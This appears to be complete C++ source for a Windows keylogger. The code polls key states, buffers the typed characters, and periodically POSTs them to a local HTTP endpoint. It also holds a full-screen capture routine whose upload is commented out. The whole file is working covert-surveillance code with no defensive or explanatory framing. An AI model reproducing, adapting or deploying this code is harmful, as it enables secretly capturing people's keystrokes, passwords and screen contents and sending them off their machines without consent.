#define _WINSOCKAPI_
#include <Windows.h>
#include <Gdiplus.h>
#include <WinSock2.h>
#include <vector>
#include <sstream>
#include <iostream>

#pragma comment (lib,"Gdiplus.lib")
#pragma comment (lib,"ws2_32.lib")

using namespace Gdiplus;
using namespace std;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
   UINT num = 0;          // number of image encoders
   UINT size = 0;         // size of the image encoder array in bytes
   ImageCodecInfo* pImageCodecInfo = NULL;
   GetImageEncodersSize(&num, &size);
   if(size == 0)
      return -1;  // Failure

   vector<char> buf(size);
   pImageCodecInfo = (ImageCodecInfo*)&buf[0];

   GetImageEncoders(num, size, pImageCodecInfo);

   for(UINT j = 0; j < num; ++j) {
      if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
         *pClsid = pImageCodecInfo[j].Clsid;
         return j;  // Success
      }    
   }

   return -1;  // Failure
}


string captureScreen()
{
    int	width = GetSystemMetrics(SM_CXSCREEN);
    int	height = GetSystemMetrics(SM_CYSCREEN);

    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);

    HDC	hBmpFileDC = CreateCompatibleDC(hDesktopDC);
    HBITMAP	hBmpFileBitmap = CreateCompatibleBitmap(hDesktopDC, width, height);

    HBITMAP hOldBitmap = (HBITMAP) SelectObject(hBmpFileDC, hBmpFileBitmap);
    BitBlt(hBmpFileDC, 0, 0, width, height, hDesktopDC, 0, 0, SRCCOPY | CAPTUREBLT);
    SelectObject(hBmpFileDC, hOldBitmap);


    Bitmap* image = Bitmap::FromHBITMAP(hBmpFileBitmap, NULL);

    CLSID encoderClsid;
    GetEncoderClsid(L"image/png", &encoderClsid);

    EncoderParameters encoderParameters;
    encoderParameters.Count = 1;
    encoderParameters.Parameter[0].Guid = EncoderQuality;
    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParameters.Parameter[0].NumberOfValues = 1;
    ULONG quality = 0;
    encoderParameters.Parameter[0].Value = &quality;

    IStream *pStream = NULL;
    HRESULT hrRet = CreateStreamOnHGlobal(NULL, TRUE, &pStream);

    Status stat = image->Save(pStream, &encoderClsid, &encoderParameters);

    LARGE_INTEGER liZero = {0};
    ULARGE_INTEGER pos = {0};
    STATSTG stg = {};
    hrRet = pStream->Seek(liZero, STREAM_SEEK_SET, &pos); // seek to end
    hrRet = pStream->Stat(&stg, STATFLAG_NONAME); // get offset

    string buffer;
    buffer.resize(stg.cbSize.LowPart);
    ULONG bytesRead=0;
    hrRet = pStream->Read((char*)buffer.data(), stg.cbSize.LowPart, &bytesRead);
    pStream->Release();

    delete image;
    DeleteDC(hBmpFileDC);
    DeleteObject(hBmpFileBitmap);

    return buffer;
}

bool keyPressedNow(DWORD vk) {
    SHORT x = GetAsyncKeyState(vk);
    return (x & 0x8000) != 0;
}


string g_keysBuffer = ">";
bool g_wasPressed[256] = {0};


void sampleKeys()
{
    static char vks[]       = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ";
    static char noShift[]   = "abcdefghijklmnopqrstuvwxyz0123456789 ";
    static char withShift[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ)!@#$%^&*( ";

    bool isShift = keyPressedNow(VK_SHIFT);
    for(int i = 0; i < _countof(vks); ++i) {
        bool isPress = keyPressedNow(vks[i]);
        if (isPress) {
            char c;
            if (isShift)
                c = withShift[i];
            else
                c = noShift[i];
            if (!g_wasPressed[i]) {
                g_keysBuffer += c;
            }
            g_wasPressed[i] = true;
        }
        else {
            g_wasPressed[i] = false;
        }
    }
}



void postData(const string& url, const string& buf)
{
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   
    sockaddr_in dstaddr;
    ZeroMemory(&dstaddr, sizeof(dstaddr));
    dstaddr.sin_family = AF_INET;
    dstaddr.sin_port = htons(8080);
    dstaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    DWORD msecTimeout = 200;
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&msecTimeout, sizeof(msecTimeout));

    if (connect(s, (sockaddr*)&dstaddr, sizeof(dstaddr)) != 0) {
        cout << "failed connect " << endl;
        return;
    }

    stringstream ss;
    ss << "POST " << url << " HTTP/1.1\r\nContent-Length: " << buf.size() << "\r\n\r\n";
    string header = ss.str();
    send(s, header.c_str(), header.size(), 0);
    send(s, &buf[0], buf.size(), 0);
    shutdown(s, SD_BOTH);
    closesocket(s);

    cout << "sent " << url << endl;
}


int main(int argc, char* argv[])
{
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    WSADATA wsaData = {0};
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    int count = 0;
    while(1) {
        //vector<char> buf = captureScreen();
        //postData("/screen", buf);
        //Sleep(100);

        sampleKeys();
        Sleep(1);
        //cout << "\r" << g_keysBuffer;

        ++count;
        if ((count % 2000) == 0) {
            if (g_keysBuffer.size() > 0) {
                postData("/keys", g_keysBuffer);
            }
            g_keysBuffer.clear();
        }
    }


    return 0;
}
